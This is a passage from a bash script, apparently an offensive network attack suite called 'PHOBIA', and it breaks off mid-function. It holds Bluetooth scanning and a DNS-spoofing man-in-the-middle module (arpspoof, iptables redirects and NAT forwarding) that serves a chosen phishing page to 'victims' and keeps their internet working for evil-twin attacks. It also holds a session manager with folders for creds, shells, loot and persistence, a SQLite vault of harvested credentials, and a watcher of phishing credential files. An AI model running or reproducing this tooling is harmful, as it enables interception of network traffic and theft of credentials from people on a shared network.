        read -p "$(echo -e ${YELLOW}'Pick number / MAC / blank=abort: '${NC})" PICK
        [ -z "$PICK" ] && return
        if [[ "$PICK" =~ ^[0-9]+$ ]]; then
            eval "BT_MAC=\"\$BT_HIST_$PICK\""
        else
            BT_MAC="$PICK"
        fi
        [ -n "$BT_MAC" ] && bt_save_history "$BT_MAC"
        return
    fi

    printf "  ${BOLD}%-4s %-22s %s${NC}\n" "No." "MAC" "NAME"
    echo -e "${CYAN}  ------------------------------------------${NC}"
    local n=1
    while read -r mac name; do
        printf "  ${BOLD}%-4s${NC} ${YELLOW}%-22s${NC} ${GREEN}%s${NC}\n" "$n" "$mac" "${name:-<unknown>}"
        eval "BT_LIST_$n=\"$mac\""
        bt_save_history "$mac" "${name:-<unknown>}"
        n=$((n+1))
    done < /tmp/bt_pick.txt
    echo -e "${CYAN}  ------------------------------------------${NC}"

    bt_show_history
    echo ""
    read -p "$(echo -e ${YELLOW}'Pick target number (or MAC): '${NC})" PICK

    if [[ "$PICK" =~ ^[0-9]+$ ]]; then
        eval "BT_MAC=\"\$BT_LIST_$PICK\""
        if [ -z "$BT_MAC" ]; then
            eval "BT_MAC=\"\$BT_HIST_$PICK\""
        fi
    else
        BT_MAC="$PICK"
    fi
    [ -n "$BT_MAC" ] && bt_save_history "$BT_MAC"
}

# ===============================================================
# BT SCAN (classic) — robust
# ===============================================================
bt_scan() {
    print_banner
    menu_header "C L A S S I C   B T   S C A N"
    bt_pick_iface
    bt_init_adapter

    echo -e "${DIM}    Scanning classic 12s...${NC}"
    echo ""
    rm -f /tmp/bt_classic.txt
    sudo timeout 12 hcitool -i "$BT_IF" scan 2>/dev/null \
        | grep -E "([0-9A-F]{2}:){5}[0-9A-F]{2}" > /tmp/bt_classic.txt

    if [ -s /tmp/bt_classic.txt ]; then
        printf "  ${BOLD}%-22s %s${NC}\n" "MAC" "NAME"
        echo -e "${CYAN}  ------------------------------------${NC}"
        while read -r mac name; do
            printf "  ${YELLOW}%-22s${NC} ${GREEN}%s${NC}\n" "$mac" "${name:-<unknown>}"
            bt_save_history "$mac" "${name:-<unknown>}"
        done < /tmp/bt_classic.txt
    else
        echo -e "${YELLOW}[!] No classic devices found.${NC}"
        echo -e "${DIM}    Try BLE scan (option 2) — modern phones use BLE.${NC}"
    fi
    echo ""
    menu_footer
    pause
}

# ===============================================================
# BT SCAN (BLE) — robust
# ===============================================================
bt_scan_le() {
    print_banner
    menu_header "B L E   S C A N"
    bt_pick_iface
    bt_init_adapter

    echo -e "${DIM}    Scanning BLE 12s...${NC}"
    echo ""
    rm -f /tmp/bt_le.txt
    sudo timeout 12 hcitool -i "$BT_IF" lescan --duplicates 2>/dev/null > /tmp/bt_le.txt
    sudo pkill -f "hcitool.*lescan" 2>/dev/null

    if [ -s /tmp/bt_le.txt ]; then
        sort -u /tmp/bt_le.txt | grep -E "([0-9A-F]{2}:){5}[0-9A-F]{2}" | \
        awk '{ mac=$1; sub(/^[^ ]+ */,""); print mac" "$0 }' | \
        while read -r mac name; do
            printf "  ${YELLOW}%-22s${NC} ${GREEN}%s${NC}\n" "$mac" "${name:-<unknown>}"
            bt_save_history "$mac" "${name:-<unknown>}"
        done
    else
        echo -e "${YELLOW}[!] No BLE devices found.${NC}"
        echo -e "${DIM}    Make sure the device is advertising.${NC}"
    fi
    echo ""
    menu_footer
    pause
}

# ===============================================================
# ENTRY POINT
# ===============================================================

# ===============================================================
# DNS SPOOF — silenced, page picker, HTTP server for spoofed hits
# ===============================================================

# silent runner — mutes parent shell stderr so no "Killed" spam
_dnsm_silent() {
    exec 9>&2 2>/dev/null
    "$@" >/dev/null 2>&1
    exec 2>&9 9>&-
}

# pick which HTML page the spoof will serve
# serve a page on :80 for spoofed DNS hits
# ===============================================================
# DNS SPOOF — ask
# ===============================================================
# ===============================================================
# DNS SPOOF — start
# ===============================================================
# ===============================================================
# DNS SPOOF — stop
# ===============================================================
# ===============================================================
# DNS SPOOF — live log
# ===============================================================
dnsm_live_log() {
    print_banner
    menu_header "L I V E   D N S   L O G"
    if [ ! -f /tmp/dnsm.log ]; then
        phb_row "  No active spoof yet." "${BOLD}${YELLOW}"
        phb_row "  Start one first (option 1)." "${DIM}${GREY}"
        menu_footer
        addon_wait
        return
    fi
    menu_footer
    echo ""
    tail -f /tmp/dnsm.log
}

# ===============================================================
# DNS SPOOF — menu
# ===============================================================
menu_standalone_dns() {
    trap on_interrupt INT
    while true; do
        print_banner
        menu_header "S T A N D A L O N E   D N S   S P O O F"
        phb_row "  Redirect specific hostnames on your network." "${DIM}${GREY}"
        phb_div
        phb_row "  -- ACTIONS --" "${BOLD}${CYAN}"
        phb_row "  [1]  Start DNS spoof"       "${BOLD}${CYAN}"
        phb_row "  [2]  View live log"         "${BOLD}${CYAN}"
        phb_row "  [3]  Stop spoof"            "${BOLD}${RED}"
        phb_div
        phb_row "  [0]  Back"                  "${RED}"
        menu_footer
        read -p "$(echo -e ${YELLOW}'Choice: '${NC})" SD
        case "$SD" in
            1) dnsm_start ;;
            2) dnsm_live_log ;;
            3) dnsm_stop; addon_wait ;;
            0) return ;;
            *) sleep 1 ;;
        esac
    done
}

# ===============================================================
# ENTRY POINT
# ===============================================================

# ===============================================================
# CLEAN LAYOUT — cached padding, atomic screen clear, no drift
# ===============================================================

PHOBIA_W=86

# save terminal width ONCE per render into PHOBIA_PAD.
# every row uses it so no row can drift.
PHOBIA_PAD=0
_compute_pad() {
    local cols
    cols=$(stty size 2>/dev/null | awk '{print $2}')
    [ -z "$cols" ] && cols=$(tput cols 2>/dev/null)
    [ -z "$cols" ] && cols=100
    [ "$cols" -lt 90 ] && cols=90
    PHOBIA_PAD=$(( (cols - PHOBIA_W - 2) / 2 ))
    [ $PHOBIA_PAD -lt 0 ] && PHOBIA_PAD=0
}

# visible char count (strip ANSI, count UTF-8 chars)
_plen() {
    printf '%s' "$1" | sed $'s/\x1b\\[[0-9;]*m//g' | LC_ALL=C.UTF-8 wc -m | tr -d ' '
}

# atomic clear: escape sequence, home cursor, flush
_clear_screen() {
    printf '\033[2J\033[H'
}

# ===============================================================
# BANNER — clean, centered, single pad
# ===============================================================
# ===============================================================
# BOX HELPERS — read cached PHOBIA_PAD only
# ===============================================================
phb_top() {
    _compute_pad
    local pad="$PHOBIA_PAD"
    local i line="+"
    for ((i=0;i<PHOBIA_W;i++)); do line+="-"; done
    line+="+"
    printf "%*s" "$pad" ""
    echo -e "${BOLD}${CYAN}${line}${NC}"
}
phb_bot()  { phb_top; }
phb_div()  { phb_top; }
phb_blank() {
    local pad="$PHOBIA_PAD"
    printf "%*s" "$pad" ""
    printf "${BOLD}${CYAN}|${NC}"
    printf "%*s" "$PHOBIA_W" ""
    printf "${BOLD}${CYAN}|${NC}\n"
}
phb_row() {
    local text="$1" color="${2:-}"
    local pad="$PHOBIA_PAD"
    local len fill
    len=$(_plen "$text")
    fill=$(( PHOBIA_W - len - 1 )); [ $fill -lt 0 ] && fill=0
    printf "%*s" "$pad" ""
    printf "${BOLD}${CYAN}|${NC} "
    if [ -n "$color" ]; then
        echo -ne "${color}${text}${NC}"
    else
        echo -ne "$text"
    fi
    printf "%*s" "$fill" ""
    printf "${BOLD}${CYAN}|${NC}\n"
}
phb_center() {
    local text="$1" color="${2:-}"
    local pad="$PHOBIA_PAD"
    local len left right
    len=$(_plen "$text")
    left=$(( (PHOBIA_W - len) / 2 )); [ $left -lt 0 ] && left=0
    right=$(( PHOBIA_W - len - left )); [ $right -lt 0 ] && right=0
    printf "%*s" "$pad" ""
    printf "${BOLD}${CYAN}|${NC}"
    printf "%*s" "$left" ""
    if [ -n "$color" ]; then
        echo -ne "${color}${text}${NC}"
    else
        echo -ne "$text"
    fi
    printf "%*s" "$right" ""
    printf "${BOLD}${CYAN}|${NC}\n"
}

# header + footer used by all submenus
menu_header() {
    local title="$1"
    print_banner
    _compute_pad
    phb_top
    phb_center "◤  $title  ◢" "${BOLD}${MAGENTA}"
    phb_div
}
menu_footer() {
    _compute_pad
    phb_bot
    echo ""
}
menu_row() {
    _compute_pad
    phb_row "$1" "$2"
}

# ===============================================================
# ENTRY POINT
# ===============================================================

# ===============================================================
# WAN INTERFACE / GATEWAY AUTO-DETECT
# ===============================================================
_dnsm_silent() {
    exec 9>&2 2>/dev/null
    "$@" >/dev/null 2>&1
    exec 2>&9 9>&-
}

# find the interface that owns the default route
_wan_iface() {
    local w
    w=$(ip route show default 2>/dev/null | awk '/^default/ {print $5; exit}')
    [ -z "$w" ] && w=$(ip -4 -o addr show 2>/dev/null \
        | awk '$2!="lo" && $3=="inet" {print $2; exit}')
    echo "$w"
}

# find the current default gateway
_wan_gateway() {
    ip route show default 2>/dev/null | awk '/^default/ {print $3; exit}'
}

# ===============================================================
# INTERNET PASSTHROUGH — for evil twin and any other attack
# that needs victim traffic to keep working
# ===============================================================
ask_internet_passthrough() {
    print_banner
    menu_header "I N T E R N E T   P A S S T H R O U G H"

    local wan gw
    wan=$(_wan_iface)
    gw=$(_wan_gateway)

    if [ -z "$wan" ]; then
        phb_row "  No WAN interface detected." "${BOLD}${RED}"
        phb_row "  Connect a network first (wifi or ethernet)." "${DIM}${GREY}"
        menu_footer
        addon_wait
        DO_INTERNET="no"
        return
    fi

    phb_row "  WAN interface:  $wan" "${BOLD}${CYAN}"
    phb_row "  Gateway:        ${gw:-none}" "${BOLD}${CYAN}"
    phb_row "  Attack iface:   $INTERFACE" "${BOLD}${CYAN}"
    phb_div
    phb_row "  Give victims real internet while they're MITM'd?" "${BOLD}${YELLOW}"
    phb_row "  Yes = their traffic forwards through your box" "${DIM}${GREY}"
    phb_row "  No  = isolated portal (phishing page only)" "${DIM}${GREY}"
    phb_div
    phb_row "  [y]  Enable passthrough (recommended)" "${GREEN}"
    phb_row "  [n]  Isolated, no internet" "${YELLOW}"
    menu_footer
    read -p "$(echo -e ${YELLOW}'Choice [y/N]: '${NC})" INET_CHOICE
    INET_CHOICE="${INET_CHOICE,,}"

    if [ "$INET_CHOICE" = "y" ] || [ "$INET_CHOICE" = "yes" ]; then
        DO_INTERNET="yes"

        # enable forwarding
        _dnsm_silent sudo sysctl -w net.ipv4.ip_forward=1

        # flush any old rules
        _dnsm_silent sudo iptables -t nat -D POSTROUTING -o "$wan" -j MASQUERADE
        _dnsm_silent sudo iptables -D FORWARD -i "$INTERFACE" -o "$wan" -j ACCEPT
        _dnsm_silent sudo iptables -D FORWARD -i "$wan" -o "$INTERFACE" -m state --state RELATED,ESTABLISHED -j ACCEPT

        # allow forward in both directions
        _dnsm_silent sudo iptables -t nat -A POSTROUTING -o "$wan" -j MASQUERADE
        _dnsm_silent sudo iptables -A FORWARD -i "$INTERFACE" -o "$wan" -j ACCEPT
        _dnsm_silent sudo iptables -A FORWARD -i "$wan" -o "$INTERFACE" -m state --state RELATED,ESTABLISHED -j ACCEPT

        # accept traffic destined to us (DNS redirects) in INPUT
        _dnsm_silent sudo iptables -D INPUT -i "$INTERFACE" -p udp --dport 53 -j ACCEPT
        _dnsm_silent sudo iptables -D INPUT -i "$INTERFACE" -p tcp --dport 53 -j ACCEPT
        _dnsm_silent sudo iptables -D INPUT -i "$INTERFACE" -p tcp --dport 80 -j ACCEPT
        _dnsm_silent sudo iptables -A INPUT -i "$INTERFACE" -p udp --dport 53 -j ACCEPT
        _dnsm_silent sudo iptables -A INPUT -i "$INTERFACE" -p tcp --dport 53 -j ACCEPT
        _dnsm_silent sudo iptables -A INPUT -i "$INTERFACE" -p tcp --dport 80 -j ACCEPT

        # verify masquerade actually landed
        if _dnsm_silent sudo iptables -t nat -C POSTROUTING -o "$wan" -j MASQUERADE; then
            phb_div
            phb_row "  Internet passthrough ENABLED" "${BOLD}${GREEN}"
            phb_row "  Victim traffic -> $INTERFACE -> $wan -> $gw" "${DIM}${GREY}"
        else
            phb_div
            phb_row "  Failed to set NAT rule." "${BOLD}${RED}"
            phb_row "  Check iptables / privileges." "${DIM}${GREY}"
            DO_INTERNET="no"
        fi
    else
        DO_INTERNET="no"
        _dnsm_silent sudo sysctl -w net.ipv4.ip_forward=0
        _dnsm_silent sudo iptables -t nat -D POSTROUTING -o "$wan" -j MASQUERADE
        _dnsm_silent sudo iptables -D FORWARD -i "$INTERFACE" -o "$wan" -j ACCEPT
        _dnsm_silent sudo iptables -D FORWARD -i "$wan" -o "$INTERFACE" -m state --state RELATED,ESTABLISHED -j ACCEPT
        phb_div
        phb_row "  Portal isolated - no internet" "${BOLD}${YELLOW}"
    fi
    menu_footer
    sleep 1
}

# ===============================================================
# DNS SPOOF — ask (fixed subnet + gateway auto)
# ===============================================================
dnsm_ask() {
    print_banner
    menu_header "S T A N D A L O N E   D N S   S P O O F"

    phb_row "  MITM between victims and the gateway." "${DIM}${GREY}"
    phb_row "  Spoofed domains hit your IP. Everything else passes." "${DIM}${GREY}"
    phb_div

    # auto-recover wlan0 if stuck in monitor mode
    if iw dev wlan0 info 2>/dev/null | grep -q "type monitor"; then
        phb_row "  wlan0 in monitor mode, restoring managed..." "${BOLD}${YELLOW}"
        _dnsm_silent sudo systemctl stop NetworkManager
        _dnsm_silent sudo ip link set wlan0 down
        _dnsm_silent sudo iw wlan0 set type managed
        _dnsm_silent sudo ip link set wlan0 up
        _dnsm_silent sudo systemctl start NetworkManager
        sudo dhclient wlan0 >/dev/null 2>&1 &
        sleep 3
    fi

    # interface: prefer $INTERFACE, fall back to auto-detect
    local iface="$INTERFACE"
    if ! ip -4 addr show "$iface" 2>/dev/null | grep -q "inet "; then
        iface=$(_wan_iface)
    fi
    iface=$(echo "$iface" | sed 's/[^a-zA-Z0-9]//g')
    if [ -z "$iface" ]; then
        phb_row "  No usable interface." "${BOLD}${RED}"
        menu_footer
        addon_wait
        return 1
    fi

    local myip
    myip=$(ip -4 -o addr show "$iface" | awk '{print $4}' | head -1 | cut -d/ -f1)
    local cidr
    cidr=$(ip -4 -o addr show "$iface" | awk '{print $4}' | head -1)
    local prefix="${cidr#*/}"
    local subnet_ip="${myip%.*}.0/${prefix}"

    local gw
    gw=$(ip route show dev "$iface" 2>/dev/null | awk '/^default/ {print $3; exit}')
    [ -z "$gw" ] && gw=$(_wan_gateway)

    DNSM_IFACE="$iface"

    phb_row "  Interface: $iface" "${BOLD}${CYAN}"
    phb_row "  My IP:     $myip" "${BOLD}${CYAN}"
    phb_row "  Gateway:   ${gw:-none}" "${BOLD}${CYAN}"
    phb_row "  Subnet:    $subnet_ip" "${BOLD}${CYAN}"
    if [ -z "$gw" ]; then
        phb_row "  WARNING: no gateway - spoof will break victim internet" "${BOLD}${YELLOW}"
    fi
    menu_footer
    echo ""

    read -p "$(echo -e ${YELLOW}'Target IP (blank = whole subnet): '${NC})" DNSM_TARGET
    read -p "$(echo -e ${YELLOW}'Hostnames to spoof (comma-sep): '${NC})" DNSM_SPOOF
    read -p "$(echo -e ${YELLOW}"Redirect to IP [your IP = $myip]: "${NC})" DNSM_REDIR
    DNSM_REDIR="${DNSM_REDIR:-$myip}"
    [ -z "$DNSM_TARGET" ] && DNSM_TARGET="$subnet_ip"

    if [ -z "$DNSM_SPOOF" ]; then
        echo -e "${RED}[!] No hostnames specified.${NC}"
        addon_wait
        return 1
    fi

    # ask about internet passthrough — this is the key part
    # that keeps victim internet working
    ask_internet_passthrough

    # pick the page to serve
    if ! _dnsm_pick_page; then
        echo -e "${DIM}    Cancelled.${NC}"
        addon_wait
        return 1
    fi

    DNSM_GW="$gw"
    DNSM_MYIP="$myip"
    DNSM_SERVE_PAGE="$DNSM_PAGE"

    echo ""
    echo -e "${BOLD}${GREEN}========= DNS SPOOF SETUP =========${NC}"
    echo -e "  ${BOLD}Interface:${NC}  $DNSM_IFACE"
    echo -e "  ${BOLD}Gateway:${NC}    ${DNSM_GW:-none}"
    echo -e "  ${BOLD}Target:${NC}     $DNSM_TARGET"
    echo -e "  ${BOLD}Redirect:${NC}   $DNSM_REDIR"
    echo -e "  ${BOLD}Spoofing:${NC}   $DNSM_SPOOF"
    echo -e "  ${BOLD}Internet:${NC}   $DO_INTERNET"
    if [ -n "$DNSM_SERVE_PAGE" ]; then
        echo -e "  ${BOLD}Page:${NC}       $(basename "$DNSM_SERVE_PAGE")"
    fi
    echo -e "${BOLD}${GREEN}===================================${NC}"
    echo ""
    echo -e "${YELLOW}[!] Victims keep internet (except spoofed domains).${NC}"
    echo -e "${YELLOW}[!] Only do this on your own network.${NC}"
    echo ""
    read -p "$(echo -e ${BOLD}${YELLOW}'Confirm? [y/N]: '${NC})" GO
    [ "$GO" != "y" ] && [ "$GO" != "Y" ] && return 1
    return 0
}

# ===============================================================
# DNS SPOOF — start (with proper forwarding)
# ===============================================================
# ===============================================================
# DNS SPOOF — stop (full cleanup)
# ===============================================================
dnsm_stop() {
    echo ""
    echo -e "${YELLOW}[*] Stopping DNS spoof...${NC}"
    local wan
    wan=$(_wan_iface)

    _dnsm_silent sudo pkill -9 -f "dnsmasq.*dnsm"
    _dnsm_silent sudo pkill -9 -f arpspoof
    _dnsm_silent sudo pkill -9 -f phobia_dnspage.py

    _dnsm_silent sudo iptables -t nat -D PREROUTING -i "$DNSM_IFACE" -p udp --dport 53 -j REDIRECT --to-port 53
    _dnsm_silent sudo iptables -t nat -D PREROUTING -i "$DNSM_IFACE" -p tcp --dport 53 -j REDIRECT --to-port 53
    _dnsm_silent sudo iptables -t nat -D POSTROUTING -o "$wan" -j MASQUERADE
    _dnsm_silent sudo iptables -D FORWARD -i "$DNSM_IFACE" -o "$wan" -j ACCEPT
    _dnsm_silent sudo iptables -D FORWARD -i "$wan" -o "$DNSM_IFACE" -m state --state RELATED,ESTABLISHED -j ACCEPT
    _dnsm_silent sudo iptables -D INPUT -i "$DNSM_IFACE" -p udp --dport 53 -j ACCEPT
    _dnsm_silent sudo iptables -D INPUT -i "$DNSM_IFACE" -p tcp --dport 53 -j ACCEPT
    _dnsm_silent sudo iptables -D INPUT -i "$DNSM_IFACE" -p tcp --dport 80 -j ACCEPT
    _dnsm_silent sudo sysctl -w net.ipv4.ip_forward=0

    rm -f /tmp/dnsmasq_dnsm.conf /tmp/phobia_dnspage.py

    echo -e "${GREEN}[+] Stopped. Network restored.${NC}"
    trap - INT
    trap on_interrupt INT
}

# ===============================================================
# ENTRY POINT
# ===============================================================

# ===============================================================
# PRINT BANNER — uses the SAME pad as phb_row so everything aligns
# ===============================================================
print_banner() {
    _clear_screen
    _compute_pad

    local cols
    cols=$(stty size 2>/dev/null | awk '{print $2}')
    [ -z "$cols" ] && cols=$(tput cols 2>/dev/null)
    [ -z "$cols" ] && cols=100
    [ "$cols" -lt 120 ] && cols=120

    local W=$(( cols - 20 ))
    [ $W -gt 220 ] && W=220
    [ $W -lt 100 ] && W=100
    local PAD=$(( (cols - W - 2) / 2 ))
    [ $PAD -lt 0 ] && PAD=0

    local line="+"
    for ((i=0;i<W;i++)); do line+="="; done
    line+="+"

    _pb() {
        printf "%*s" "$PAD" ""
        echo -e "${BOLD}${CYAN}$1${NC}"
    }
    _pc() {
        local t="$1" c="$2"
        local len; len=$(_plen "$t")
        local l=$(( (W - len) / 2 )); [ $l -lt 0 ] && l=0
        local r=$(( W - len - l )); [ $r -lt 0 ] && r=0
        printf "%*s" "$PAD" ""
        printf "${BOLD}${CYAN}|${NC}"
        printf "%*s" "$l" ""
        printf "%b%s${NC}" "$c" "$t"
        printf "%*s" "$r" ""
        printf "${BOLD}${CYAN}|${NC}
"
    }

    _pb "$line"
    _pc '██████╗ ██╗  ██╗ ██████╗ ██████╗  ██╗ ██╗  ██╗' "${BOLD}${RED}"
    _pc '██╔══██╗██║  ██║██╔═████╗██╔══██╗███║ ██║  ██║' "${BOLD}${RED}"
    _pc '██████╔╝███████║██║██╔██║██████╔╝╚██║ ███████║' "${BOLD}${RED}"
    _pc '██╔═══╝ ██╔══██║████╔╝██║██╔══██╗ ██║ ╚════██║' "${BOLD}${RED}"
    _pc '██║     ██║  ██║╚██████╔╝██████╔╝ ██║      ██║' "${BOLD}${RED}"
    _pc '╚═╝     ╚═╝  ╚═╝ ╚═════╝ ╚═════╝  ╚═╝      ╚═╝' "${BOLD}${RED}"
    _pb "$line"
    _pc "Created By : @zeruaep  ◇  PHOBIA Suite v1.0.0  ◇  Status : READY" "${BOLD}${GREEN}"
    _pb "$line"
    echo ""
}

# ===============================================================
# ENTRY POINT
# ===============================================================

# ===============================================================
# WAIT PROMPTS — bulletproof "Press ENTER to return..."
# ===============================================================
# Both functions flush stdin and force a read so the prompt always
# shows and the menu never silently redraws on top of the output.

# same behavior, kept for functions that call `pause`
pause() {
    addon_wait
}

# ===============================================================
# ENTRY POINT
# ===============================================================

# ===============================================================
# SESSION MANAGER v1
# Every engagement gets a timestamped folder. All attack output
# lands under $SESSION_DIR so it can be queried and reported.
# ===============================================================

SESSIONS_ROOT="$BASE_DIR/sessions"
mkdir -p "$SESSIONS_ROOT" 2>/dev/null

# current session (empty = none)
SESSION_DIR=""
SESSION_NAME=""

_sess_init() {
    local name="${1:-engagement}"
    local stamp; stamp=$(date +%Y%m%d_%H%M%S)
    name=$(echo "$name" | tr -c 'a-zA-Z0-9_-' '_' | cut -c1-32)
    SESSION_NAME="${name}_${stamp}"
    SESSION_DIR="$SESSIONS_ROOT/$SESSION_NAME"
    mkdir -p "$SESSION_DIR"/{scans,creds,shells,handshakes,screenshots,loot,reports,persist}
    touch "$SESSION_DIR/session.info"
    {
        echo "name=$SESSION_NAME"
        echo "created=$(date)"
        echo "interface=$INTERFACE"
        echo "monitor=$MONITOR"
    } > "$SESSION_DIR/session.info"
    echo "$SESSION_DIR" > "$SESSIONS_ROOT/.current"
    echo -e "${GREEN}[+] Session: $SESSION_NAME${NC}"
    echo -e "${DIM}    Path: $SESSION_DIR${NC}"
}

_sess_load_current() {
    if [ -f "$SESSIONS_ROOT/.current" ]; then
        local c; c=$(cat "$SESSIONS_ROOT/.current")
        if [ -d "$c" ]; then
            SESSION_DIR="$c"
            SESSION_NAME=$(basename "$c")
        fi
    fi
}

_sess_or_init() {
    [ -z "$SESSION_DIR" ] && _sess_init "auto"
}

# convenience accessor: if session is active, echo its dir; else echo logs dir
_sess_dir() {
    [ -n "$SESSION_DIR" ] && echo "$SESSION_DIR" || echo "$LOGS_DIR"
}

_sess_list() {
    print_banner
    menu_header "S E S S I O N S"
    local cur=""
    [ -f "$SESSIONS_ROOT/.current" ] && cur=$(cat "$SESSIONS_ROOT/.current")
    local i=1
    local dirs=()
    while read -r d; do
        [ -z "$d" ] && continue
        dirs+=("$d")
    done < <(find "$SESSIONS_ROOT" -maxdepth 1 -mindepth 1 -type d 2>/dev/null | sort -r)

    if [ ${#dirs[@]} -eq 0 ]; then
        phb_row "  No sessions yet." "${DIM}${GREY}"
        phb_row "  Create one with [1]." "${DIM}${GREY}"
    else
        phb_row "  -- SAVED SESSIONS --" "${BOLD}${CYAN}"
        for d in "${dirs[@]}"; do
            local base; base=$(basename "$d")
            local mark=""
            [ "$d" = "$cur" ] && mark=" ${GREEN}[current]${NC}"
            local nfiles; nfiles=$(find "$d" -type f 2>/dev/null | wc -l)
            phb_row "  [$i]  $base  (${nfiles} files)${mark}" "${BOLD}${GREEN}"
            eval "SESS_$i=\"$d\""
            i=$((i+1))
        done
    fi
    phb_div
    phb_row "  [n]  New session" "${BOLD}${CYAN}"
    phb_row "  [a]  Adopt a session" "${BOLD}${CYAN}"
    phb_row "  [s]  Show current session info" "${BOLD}${CYAN}"
    phb_row "  [o]  Open current session folder" "${DIM}${GREY}"
    phb_div
    phb_row "  [0]  Back" "${RED}"
    menu_footer
    read -p "Choice: " SC
    case "$SC" in
        0) return ;;
        n|N) read -p "Session name [engagement]: " nm; nm="${nm:-engagement}"; _sess_init "$nm"; addon_wait ;;
        a|A)
            read -p "Number to adopt: " NUM
            [ -z "$NUM" ] && { addon_wait; return; }
            eval "d=\"\$SESS_$NUM\""
            if [ -n "$d" ] && [ -d "$d" ]; then
                SESSION_DIR="$d"
                SESSION_NAME=$(basename "$d")
                echo "$d" > "$SESSIONS_ROOT/.current"
                echo -e "${GREEN}[+] Adopted: $SESSION_NAME${NC}"
            fi
            addon_wait ;;
        s|S)
            _sess_load_current
            if [ -z "$SESSION_DIR" ]; then
                echo -e "${YELLOW}[!] No active session.${NC}"
            else
                echo -e "${CYAN}[*] Current: $SESSION_NAME${NC}"
                cat "$SESSION_DIR/session.info" 2>/dev/null | sed 's/^/    /'
                echo ""
                echo -e "${CYAN}[*] Files:${NC}"
                find "$SESSION_DIR" -type f 2>/dev/null | sed 's|'"$SESSION_DIR"'/|    |'
            fi
            addon_wait ;;
        o|O)
            _sess_load_current
            [ -z "$SESSION_DIR" ] && { addon_wait; return; }
            if command -v xdg-open >/dev/null 2>&1; then
                xdg-open "$SESSION_DIR" >/dev/null 2>&1 &
            fi
            addon_wait ;;
        ''|*[!0-9]*) sleep 1 ;;
        *) eval "d=\"\$SESS_$SC\""
           if [ -n "$d" ] && [ -d "$d" ]; then
               SESSION_DIR="$d"; SESSION_NAME=$(basename "$d")
               echo "$d" > "$SESSIONS_ROOT/.current"
               echo -e "${GREEN}[+] Selected: $SESSION_NAME${NC}"
           fi
           addon_wait ;;
    esac
}

# auto-load at script start
_sess_load_current

# ===============================================================
# ENTRY POINT
# ===============================================================

# ===============================================================
# CREDENTIAL VAULT v1
# SQLite db of every cred harvested. Insert from any attack.
# Query across sessions.
# ===============================================================

VAULT_DB="$BASE_DIR/vault.db"
mkdir -p "$BASE_DIR" 2>/dev/null

# ensure schema
_vault_init() {
    command -v sqlite3 >/dev/null 2>&1 || {
        echo -e "${YELLOW}[!] sqlite3 not installed, installing...${NC}"
        sudo apt install -y sqlite3 >/dev/null 2>&1
    }
    command -v sqlite3 >/dev/null 2>&1 || return 1
    sqlite3 "$VAULT_DB" << 'SQL' 2>/dev/null
CREATE TABLE IF NOT EXISTS creds (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    ts TEXT,
    session TEXT,
    source TEXT,
    target TEXT,
    username TEXT,
    password TEXT,
    notes TEXT
);
SQL
}

_vault_add() {
    # $1 source  $2 target  $3 username  $4 password  [$5 notes]
    _vault_init || return 1
    local ts; ts=$(date '+%Y-%m-%d %H:%M:%S')
    local sess="${SESSION_NAME:-none}"
    local src="$1" tgt="$2" usr="$3" pwd="$4" notes="${5:-}"
    # escape single quotes
    for v in src tgt usr pwd notes sess ts; do
        eval "$v=\$(printf '%s' \"\$$v\" | sed \"s/'/''/g\")"
    done
    sqlite3 "$VAULT_DB" "INSERT INTO creds (ts,session,source,target,username,password,notes) VALUES ('$ts','$sess','$src','$tgt','$usr','$pwd','$notes');" 2>/dev/null
    echo -e "${GREEN}[+] vault: $src → $tgt  $usr:$pwd${NC}"
}

_vault_query() {
    local q="$1"
    _vault_init || return 1
    if [ -z "$q" ]; then
        sqlite3 -header -column "$VAULT_DB" "SELECT ts,session,source,target,username,password FROM creds ORDER BY id DESC LIMIT 100;" 2>/dev/null
    else
        sqlite3 -header -column "$VAULT_DB" "SELECT ts,session,source,target,username,password FROM creds WHERE target LIKE '%$q%' OR username LIKE '%$q%' OR source LIKE '%$q%' OR password LIKE '%$q%' ORDER BY id DESC LIMIT 100;" 2>/dev/null
    fi
}

_vault_menu() {
    trap on_interrupt INT
    while true; do
        print_banner
        menu_header "C R E D   V A U L T"
        local total=""
        if [ -f "$VAULT_DB" ]; then
            total=$(sqlite3 "$VAULT_DB" "SELECT COUNT(*) FROM creds;" 2>/dev/null)
        fi
        phb_row "  Database: $VAULT_DB" "${DIM}${GREY}"
        phb_row "  Total credentials: ${total:-0}" "${BOLD}${CYAN}"
        phb_div
        phb_row "  -- ACTIONS --" "${BOLD}${GREEN}"
        phb_row "  [1]  Show all (latest 100)" "${BOLD}${GREEN}"
        phb_row "  [2]  Search (target / user / source)" "${BOLD}${GREEN}"
        phb_row "  [3]  Show current session only" "${BOLD}${GREEN}"
        phb_row "  [4]  Export to CSV" "${BOLD}${GREEN}"
        phb_row "  [5]  Add manual entry" "${BOLD}${GREEN}"
        phb_row "  [6]  Wipe vault" "${BOLD}${RED}"
        phb_div
        phb_row "  [0]  Back" "${RED}"
        menu_footer
        read -p "Choice: " VC
        case "$VC" in
            0) return ;;
            1) _vault_init; echo ""; _vault_query ""; echo ""; addon_wait ;;
            2) read -p "Search term: " T; echo ""; _vault_query "$T"; echo ""; addon_wait ;;
            3) _vault_init
               local s="${SESSION_NAME:-none}"
               echo ""; sqlite3 -header -column "$VAULT_DB" "SELECT ts,source,target,username,password FROM creds WHERE session='$s' ORDER BY id DESC;" 2>/dev/null; echo ""
               addon_wait ;;
            4) local out="$BASE_DIR/vault_export_$(date +%s).csv"
               _vault_init
               sqlite3 -header -csv "$VAULT_DB" "SELECT * FROM creds;" > "$out" 2>/dev/null
               echo -e "${GREEN}[+] Exported: $out${NC}"
               addon_wait ;;
            5) read -p "Source: " S; read -p "Target: " T; read -p "User: " U; read -p "Pass: " P
               _vault_add "$S" "$T" "$U" "$P" "manual"
               addon_wait ;;
            6) read -p "$(echo -e ${BOLD}${RED}'Wipe vault? [y/N]: '${NC})" W
               [ "$W" = "y" ] && { rm -f "$VAULT_DB"; echo -e "${GREEN}[+] Wiped.${NC}"; }
               addon_wait ;;
            *) sleep 1 ;;
        esac
    done
}

# credential watcher — run in background, dings on new creds
VAULT_WATCH_PID=""
_vault_start_watch() {
    [ -n "$VAULT_WATCH_PID" ] && kill "$VAULT_WATCH_PID" 2>/dev/null
    (
        local seen=""
        while true; do
            for f in /var/www/html/creds.txt /var/www/html/verified_creds.txt \
                     "$PAGES_DIR/dns_creds.txt" "$LOGS_DIR/int_weakcreds_"*.txt; do
                [ ! -f "$f" ] && continue
